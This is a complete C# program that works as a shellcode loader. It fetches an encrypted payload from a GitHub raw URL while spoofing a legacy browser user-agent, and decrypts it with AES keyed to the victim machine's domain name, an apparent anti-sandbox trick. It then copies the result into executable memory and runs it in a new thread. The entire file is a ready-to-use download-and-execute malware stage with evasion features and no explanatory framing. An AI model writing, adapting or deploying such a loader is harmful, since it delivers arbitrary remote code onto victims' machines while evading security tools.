using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace ConsoleApp4
{
    class Program
    {
        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr VirtualAlloc(uint lpStartAddr, uint size, uint flAllocationType, uint flProtect);
        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("Kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        static void Main(string[] args)
        {

            WebClient client = new WebClient();
            client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

            Stream encodedReader = client.OpenRead("https://raw.githubusercontent.com/barfedguy1996/fuzzy-bassoon/main/calc.raw");
            StreamReader reader = new StreamReader(encodedReader);
            string encodedString = reader.ReadToEnd();

            //Console.WriteLine(encodedString);

            encodedReader.Close();
            reader.Close();

            string EncryptionKey = System.Environment.UserDomainName;
            string cipherText = encodedString.Replace(" ", "+");
            byte[] cipherBytes = Convert.FromBase64String(cipherText);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipherBytes, 0, cipherBytes.Length);
                        cs.Close();
                    }
                    cipherText = Encoding.Unicode.GetString(ms.ToArray());
                }
            }

            byte[] base64Data = Convert.FromBase64String(cipherText);

            IntPtr functionAddress = VirtualAlloc((uint)IntPtr.Zero, (uint)base64Data.Length, 0x00001000, 0x40);
            Marshal.Copy(base64Data, 0, functionAddress, base64Data.Length);


            IntPtr threadId = IntPtr.Zero;

            IntPtr hThread = CreateThread(IntPtr.Zero, (uint)base64Data.Length, functionAddress, IntPtr.Zero, 0, threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }
    }
}
